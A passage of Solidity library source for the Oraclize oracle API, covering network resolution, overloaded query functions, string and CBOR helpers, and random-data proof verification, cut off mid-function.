uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 